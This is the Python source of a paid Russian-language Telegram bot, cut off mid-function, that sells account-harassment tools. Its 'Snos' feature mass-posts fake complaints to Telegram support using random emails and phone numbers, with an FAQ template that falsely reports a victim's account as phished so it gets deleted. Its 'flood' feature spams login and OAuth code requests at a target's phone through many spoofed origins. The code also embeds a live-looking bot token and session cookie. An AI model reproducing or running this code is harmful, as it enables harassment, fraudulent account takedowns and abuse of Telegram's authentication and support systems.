import telebot
from telebot import types
from fake_useragent import UserAgent
import requests
import logging
import random
import string
import os
from datetime import datetime
import pytz
import threading
import time
import sys


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

API_TOKEN = '7460548159:AAGbEYdO9wdvSyLvETG0YJHjhr_w_ZUKg40'

bot = telebot.TeleBot(API_TOKEN)

ADMIN_IDS = [1352835400]
    
BLOCKED_USERS_FILE = 'blocked.txt'

ALLOWED_USERS_FILE = 'allowed.txt'


def restart_scheduler():
    while True:
        time.sleep(300)  # 300 секунд = 5 минут
        print("🚀 Перезапуск бота...")
        os.execl(sys.executable, sys.executable, *sys.argv)


def log_bot_start():
    try:
        logs_dir = "Logs"
        os.makedirs(logs_dir, exist_ok=True)
        
        file_path = os.path.join(logs_dir, "resets.txt")
        
        moscow_tz = pytz.timezone('Europe/Moscow')
        current_time = datetime.now(moscow_tz).strftime("%Y-%m-%d %H:%M:%S")
        
        with open(file_path, "a") as file:
            file.write(f"Bot started at (Moscow time): {current_time}\n")
        
        print(f"Bot started at (Moscow time): {current_time}, log saved to {file_path}")
    
    except Exception as e:
        print(f"Error writing to resets.txt: {e}")

if __name__ == "__main__":
    log_bot_start()

def save_user_id(user_id):
    logs_dir = "Logs"
    os.makedirs(logs_dir, exist_ok=True)
    file_path = os.path.join(logs_dir, "users.txt")
    
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            user_ids = file.read().splitlines()
    else:
        user_ids = []
    
    if str(user_id) not in user_ids:
        with open(file_path, "a") as file:
            file.write(f"{user_id}\n")

def load_allowed_users():
    try:
        with open(ALLOWED_USERS_FILE, 'r') as file:
            return set(line.strip() for line in file)
    except FileNotFoundError:
        return set()

def save_allowed_users(allowed_users):
    with open(ALLOWED_USERS_FILE, 'w') as file:
        for user_id in allowed_users:
            file.write(f"{user_id}\n")

allowed_users = load_allowed_users()

def is_allowed(user_id):
    return str(user_id) in allowed_users
    
def load_blocked_users():
    try:
        with open(BLOCKED_USERS_FILE, 'r') as file:
            return set(line.strip() for line in file)
    except FileNotFoundError:
        return set()

def save_blocked_users(blocked_users):
    with open(BLOCKED_USERS_FILE, 'w') as file:
        for user_id in blocked_users:
            file.write(f"{user_id}\n")

blocked_users = load_blocked_users()

def get_user_count():
    logs_dir = "Logs" 
    file_path = os.path.join(logs_dir, "users.txt")

    try:
        with open(file_path, "r") as file:
            user_ids = file.read().splitlines()
            return len(user_ids)
    except FileNotFoundError:
        return 0 

def log_transfer(old_user_id, new_user_id):
    logs_dir = "Logs"
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)

    log_file = os.path.join(logs_dir, "transferlogs.txt")
    log_message = f"Доступ передан с ID {old_user_id} на ID {new_user_id}\n"

    with open(log_file, 'a') as file:
        file.write(log_message)

@bot.message_handler(commands=['transfer'])
def transfer(message):
    user_id = message.from_user.id
    print(f"User ID: {user_id}")
    print(f"Allowed Users: {allowed_users}")

    if str(user_id) not in allowed_users:
        bot.reply_to(message, "У вас нет прав для выполнения этой команды.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Использование: /transfer <user_id>")
        return

    try:
        new_user_id = int(args[1])
    except ValueError:
        bot.reply_to(message, "Пожалуйста, укажите корректный user_id.")
        return

    allowed_users.add(str(new_user_id))
    allowed_users.remove(str(user_id))
    save_allowed_users(allowed_users)

    bot.reply_to(message, f"Доступ к боту передан пользователю с ID {new_user_id}, ваш доступ удален.")

    log_transfer(user_id, new_user_id)

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domain = random.choice(domains)
    email = f"{username}@{domain}"
    return email

def generate_phone_number():
    country_codes = ['+7', '+380', '+375']
    country_code = random.choice(country_codes)
    phone_number = ''.join(random.choices('0123456789', k=10))
    formatted_phone_number = f'{country_code}{phone_number}'
    return formatted_phone_number

def send_complaint(chat_id, message, repeats):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0
    for _ in range(repeats):
        email = generate_random_email()
        phone = generate_phone_number()
        response = requests.post(url, headers=headers, data={'message': message})
        if response.status_code == 200:
            complaints_sent += 1
            status = "✅Успешно"
        else:
            status = "❌Неуспешно"
        logging.info(f'Sent complaint: {message}, Email: {email}, Phone: {phone}, Status: {status}')
        bot.send_message(chat_id, f"✉️Сообщение: {message}\n📪Email: {email}\n📞Телефон: {phone}\n▶️Статус: {status}")
    return complaints_sent

@bot.message_handler(commands=['start'])
def send_welcome(message):
    save_user_id(message.chat.id)
    if is_allowed(message.chat.id):
        markup = types.InlineKeyboardMarkup()
        button_channel = types.InlineKeyboardButton("🔰 Канал", callback_data="channel")
        button_send = types.InlineKeyboardButton("🔥 Снос", callback_data="input_text")
        button_flood = types.InlineKeyboardButton("🌊 Флуд кодами", callback_data="flood")
        button_rules = types.InlineKeyboardButton("📜 Правила", callback_data="rules")
        button_faq = types.InlineKeyboardButton("❓ FAQ", callback_data="faq")
        button_shablon = types.InlineKeyboardButton("❤️ Шаблоны для сноса", callback_data="shablon")
        markup.add(button_channel, button_send)
        markup.add(button_rules, button_flood)
        markup.add(button_faq, button_shablon)
        bot.reply_to(message, "Вы в главном меню: ", reply_markup=markup)
        logging.info(f'User {message.chat.id} started the bot.')
    else:
        bot.reply_to(message, "У вас нет доступа к этому боту.\nДоступ к боту - 3$\nЗа покупкой в лс - https://t.me/hui_dur0va")
        logging.info(f'User {message.chat.id} tried to start the bot but is not allowed.')
    
@bot.callback_query_handler(func=lambda call: call.data == "shablon")
def callback_shablon(call):
    if is_allowed(call.from_user.id):
        with open('шаблоны.txt', 'rb') as file:
            bot.send_document(call.message.chat.id, file)
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к этому боту.")
        
@bot.message_handler(commands=['transferlogs'])
def send_reset_log(message):
    if message.chat.id == 1352835400: 
        try:
            logs_dir = "Logs"
            file_path = os.path.join(logs_dir, "transferlogs.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
            else:
                bot.reply_to(message, "Файл transferlogs.txt не найден.")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {str(e)}")
    else:
        bot.reply_to(message, "У вас нет доступа.")

@bot.message_handler(commands=['resetlogs'])
def send_reset_log(message):
    if message.chat.id == 1352835400: 
        try:
            logs_dir = "Logs"
            file_path = os.path.join(logs_dir, "resets.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
            else:
                bot.reply_to(message, "Файл resets.txt не найден.")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {str(e)}")
    else:
        bot.reply_to(message, "У вас нет доступа.")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    if message.chat.id == 1352835400: 
        try:
            user_count = get_user_count()
            bot.send_message(message.chat.id, f"Статистика: {user_count} пользователей")
        except Exception as e:
            bot.send_message(message.chat.id, "Произошла ошибка при получении статистики.")
    else:
        bot.send_message(message.chat.id, "У вас нет прав для выполнения этой команды.")

@bot.callback_query_handler(func=lambda call: call.data == "faq")
def faq(call):
    if is_allowed(call.from_user.id):       
        msg = bot.send_message(call.message.chat.id, "🔥 Снос - Пишете жалобу где есть юз, айди, нарушение например: Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {ID}. Пожалуйста удалите аккаунт или обнулите сессии\n\n🌊 Флуд кодами - Кидаете номер который привязан к телеграму и ему приходит множество запросов на вход в аккаунт\n\nКоманда /transfer - при помощи этой команды можно передать доступ к боту.")
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к этому боту.")

@bot.callback_query_handler(func=lambda call: call.data == "rules")
def rules(call):
    if is_allowed(call.from_user.id):
        msg = bot.send_message(call.message.chat.id, "ПРАВИЛА\n1. Возврат средств после покупки не предусмотрен.\n2. Использование функции не по назначению - снятие доступа\n3. Нанесение вреда боту (Спам командами и т.д.) - снятие доступа")
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к этому боту.")

@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.chat.id == 1352835400: 
        try:
            user_id = message.text.split()[1]
            allowed_users.add(user_id)
            save_allowed_users(allowed_users)
            bot.reply_to(message, f"Пользователь {user_id} добавлен в список разрешённых.")
        except IndexError:
            bot.reply_to(message, "Пожалуйста, укажите ID пользователя.")
    else:
        bot.reply_to(message, "У вас нет прав для выполнения этой команды.")

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.chat.id == 1352835400: 
        try:
            user_id = message.text.split()[1]
            allowed_users.discard(user_id)
            save_allowed_users(allowed_users)
            bot.reply_to(message, f"Пользователь {user_id} удалён из списка разрешённых.")
        except IndexError:
            bot.reply_to(message, "Пожалуйста, укажите ID пользователя.")
    else:
        bot.reply_to(message, "У вас нет прав для выполнения этой команды.")

@bot.callback_query_handler(func=lambda call: call.data == "channel")
def callback_channel(call):
    if is_allowed(call.from_user.id):
        bot.send_message(call.message.chat.id, "Channel - @hui_dur0va", parse_mode='none')
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к этому боту.")

@bot.callback_query_handler(func=lambda call: call.data == "input_text")
def callback_input_text(call):
    if is_allowed(call.from_user.id):
        msg = bot.send_message(call.message.chat.id, "Введите текст сообщения:")
        bot.register_next_step_handler(msg, input_repeats)
        logging.info(f'User {call.message.chat.id} is entering text.')
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к этому боту.")

@bot.callback_query_handler(func=lambda call: call.data == "input_text")
def callback_input_text(call):
    if str(call.message.chat.id) in blocked_users:
        bot.send_message(call.message.chat.id, "Вы заблокированы и не можете использовать эту команду.")
        return
    msg = bot.send_message(call.message.chat.id, "Введите текст сообщения:")
    bot.register_next_step_handler(msg, input_repeats)
    logging.info(f'User {call.message.chat.id} is entering text.')
    
def input_repeats(message):
    text = message.text
    msg = bot.send_message(message.chat.id, "Введите количество сообщений для отправки (максимум 50):")
    bot.register_next_step_handler(msg, lambda m: send_messages(m, text))

def send_messages(message, text):
    try:
        repeats = int(message.text)
        if repeats > 50:
            bot.send_message(message.chat.id, "Ошибка: количество сообщений не может превышать 100.")
            logging.error(f'User {message.chat.id} entered a number greater than 100: {repeats}')
            return
        complaints_sent = send_complaint(message.chat.id, text, repeats)
        bot.send_message(message.chat.id, f"Успешно отправлено {complaints_sent} сообщений.")
        logging.info(f'User {message.chat.id} sent {repeats} messages.')
    except ValueError:
        bot.send_message(message.chat.id, "Ошибка: введите корректное число.")
        logging.error(f'User {message.chat.id} entered an invalid number: {message.text}')
        
@bot.callback_query_handler(func=lambda call: call.data == "flood")
def callback_flood(call):
    if is_allowed(call.from_user.id):
        msg = bot.send_message(call.message.chat.id, "Введите номер телефона:")
        bot.register_next_step_handler(msg, send_flood)
    else:
        bot.answer_callback_query(call.id, "У вас нет доступа к этому боту.")

def send_flood(message):
    phone_number = message.text
    send_flood_requests(phone_number)
    bot.send_message(message.chat.id, f"Флуд на номер {phone_number} окончен ✅️")
    logging.info(f'Flood sent to {phone_number}')

def send_flood_requests(phone_number):
    ua = UserAgent()
    services = [
        {
            'url': "https://my.telegram.org/auth/send_password",
            'headers': {
                'authority': 'my.telegram.org',
                'method': 'POST',
                'path': '/auth/send_password',
                'scheme': 'https',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '20',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://my.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://my.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': '"Android"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number,
                'bot_id': '5444323279',
                'origin': 'https://fragment.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number,
                'bot_id': '5731754199',
                'origin': 'https://steam.kupikod.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number,
                'bot_id': '210944655',
                'origin': 'https://combot.org',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '1199558236',
                'origin': 'https://bot-t.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '5709824482',
                'origin': 'https://lzt.market',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '1803424014',
                'origin': 'https://ru.telegram-store.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '5463728243',
                'origin': 'https://www.spot.uz',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '6708902161',
                'origin': 'https://ourauthpoint777.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
             'url': "https://oauth.telegram.org/auth/request",
             'headers': {
                 'authority': 'oauth.telegram.org',
                 'method': 'POST',
                 'path': '/auth/request',
                 'scheme': 'https',
                 'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br, zstd',
                 'Accept-Language': 'ru-RU,ru;q=0.9',
                 'Content-Length': '17',
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                 'Origin': 'https://oauth.telegram.org',
                 'Priority': 'u=1, i',
                 'Referer': 'https://oauth.telegram.org/auth',
                 'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                 'Sec-Ch-Ua-Mobile': '?0',
                 'Sec-Ch-Ua-Platform': '"Windows"',
                 'Sec-Fetch-Dest': 'empty',
                 'Sec-Fetch-Mode': 'cors',
                 'Sec-Fetch-Site': 'same-origin',
                 'User-Agent': ua.random,
                 'X-Requested-With': 'XMLHttpRequest'
             },
             'data': {
                 'phone': f'{phone_number}',
                 'bot_id': '1852523856',
                 'origin': 'https://cabinet.presscode.app',
                 'request_access': 'write',
                 'return_to': 'https://fragment.com/'
             }
        },
        {     
             'url': "https://oauth.telegram.org/auth/request",
             'headers': {
                 'authority': 'oauth.telegram.org',
                 'method': 'POST',
                 'path': '/auth/request',
                 'scheme': 'https',
                 'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br, zstd',
                 'Accept-Language': 'ru-RU,ru;q=0.9',
                 'Content-Length': '17',
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                 'Origin': 'https://oauth.telegram.org',
                 'Priority': 'u=1, i',
                 'Referer': 'https://oauth.telegram.org/auth',
                 'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                 'Sec-Ch-Ua-Mobile': '?0',
                 'Sec-Ch-Ua-Platform': '"Windows"',
                 'Sec-Fetch-Dest': 'empty',
                 'Sec-Fetch-Mode': 'cors',
                 'Sec-Fetch-Site': 'same-origin',
                 'User-Agent': ua.random,
                 'X-Requested-With': 'XMLHttpRequest'
             },
             'data': {
                 'phone': f'{phone_number}',
                 'bot_id': '366357143',
                 'origin': 'https://www.botobot.ru',
                 'request_access': 'write',
                 'return_to': 'https://fragment.com/'
             }
        },
        {
              'url': "https://oauth.telegram.org/auth/request",
              'headers': {
                  'authority': 'oauth.telegram.org',
                  'method': 'POST',
                  'path': '/auth/request',
                  'scheme': 'https',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br, zstd',
                  'Accept-Language': 'ru-RU,ru;q=0.9',
                  'Content-Length': '17',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                  'Origin': 'https://oauth.telegram.org',
                  'Priority': 'u=1, i',
                  'Referer': 'https://oauth.telegram.org/auth',
                  'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                  'Sec-Ch-Ua-Mobile': '?0',
                  'Sec-Ch-Ua-Platform': '"Windows"',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'same-origin',
                  'User-Agent': ua.random,
                  'X-Requested-With': 'XMLHttpRequest'
              },
              'data': {
                  'phone': f'{phone_number}',
                  'bot_id': '218313516',
                  'origin': 'https://startpack.ru',
                  'request_access': 'write',
                  'return_to': 'https://fragment.com/'
              }
        },
        {
              'url': "https://oauth.telegram.org/auth/request",
              'headers': {
                  'authority': 'oauth.telegram.org',
                  'method': 'POST',
                  'path': '/auth/request',
                  'scheme': 'https',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br, zstd',
                  'Accept-Language': 'ru-RU,ru;q=0.9',
                  'Content-Length': '17',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                  'Origin': 'https://oauth.telegram.org',
                  'Priority': 'u=1, i',
                  'Referer': 'https://oauth.telegram.org/auth',
                  'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                  'Sec-Ch-Ua-Mobile': '?0',
                  'Sec-Ch-Ua-Platform': '"Windows"',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'same-origin',
                  'User-Agent': ua.random,
                  'X-Requested-With': 'XMLHttpRequest'
              },
              'data': {
                  'phone': f'{phone_number}',
                  'bot_id': '5121228034',
                  'origin': 'https://definova.club',
                  'request_access': 'write',
                  'return_to': 'https://fragment.com/'
              }
        },
        { 
              'url': "https://oauth.telegram.org/auth/request",
              'headers': {
                  'authority': 'oauth.telegram.org',
                  'method': 'POST',
                  'path': '/auth/request',
                  'scheme': 'https',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br, zstd',
                  'Accept-Language': 'ru-RU,ru;q=0.9',
                  'Content-Length': '17',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                  'Origin': 'https://oauth.telegram.org',
                  'Priority': 'u=1, i',
                  'Referer': 'https://oauth.telegram.org/auth',
                  'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                  'Sec-Ch-Ua-Mobile': '?0',
                  'Sec-Ch-Ua-Platform': '"Windows"',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'same-origin',
                  'User-Agent': ua.random,
                  'X-Requested-With': 'XMLHttpRequest'
              },
              'data': {
                  'phone': f'{phone_number}',
                  'bot_id': '5096885791',
                  'origin': 'https://accsmoll.com',
                  'request_access': 'write',
                  'return_to': 'https://fragment.com/' 
              }
        },
        {     
              'url': "https://oauth.telegram.org/auth/request",
              'headers': {
                  'authority': 'oauth.telegram.org',
                  'method': 'POST',
                  'path': '/auth/request',
                  'scheme': 'https',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br, zstd',
                  'Accept-Language': 'ru-RU,ru;q=0.9',
                  'Content-Length': '17',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                  'Origin': 'https://oauth.telegram.org',
                  'Priority': 'u=1, i',
                  'Referer': 'https://oauth.telegram.org/auth',
                  'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                  'Sec-Ch-Ua-Mobile': '?0',
                  'Sec-Ch-Ua-Platform': '"Windows"',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'same-origin',
                  'User-Agent': ua.random,
                  'X-Requested-With': 'XMLHttpRequest'
              },
              'data': {
                  'phone': f'{phone_number}',
                  'bot_id': '7131017560',
                  'origin': 'https://lolz.live',
                  'request_access': 'write',
                  'return_to': 'https://fragment.com/'
            }  
        }
    ]    
    
    for service in services:
        for _ in range(5):  
            service = random.choice(services) 
            response = requests.post(service['url'], headers=service['headers'], data=service['data'])
            logging.info(f'Service {service["url"]} responded with status {response.status_code}')
            
@bot.message_handler(commands=['block'])
def block_user(message):
    if message.chat.id == 1352835400: 
        try:
            user_id = message.text.split()[1]
            blocked_users.add(user_id)
            save_blocked_users(blocked_users)
            bot.send_message(message.chat.id, f"Пользователь {user_id} заблокирован.")
            logging.info(f'User {user_id} has been blocked by admin {message.chat.id}.')
        except (IndexError, ValueError):
            bot.send_message(message.chat.id, "Ошибка: укажите корректный ID пользователя.")
    else:
        bot.send_message(message.chat.id, "У вас нет прав для выполнения этой команды.")

@bot.message_handler(commands=['unblock'])
def unblock_user(message):
    if message.chat.id == 1352835400:  
        try:
            user_id = message.text.split()[1]
            if user_id in blocked_users:
                blocked_users.remove(user_id)
                save_blocked_users(blocked_users)
                bot.send_message(message.chat.id, f"Пользователь {user_id} разблокирован.")
                logging.info(f'User {user_id} has been unblocked by admin {message.chat.id}.')
            else:
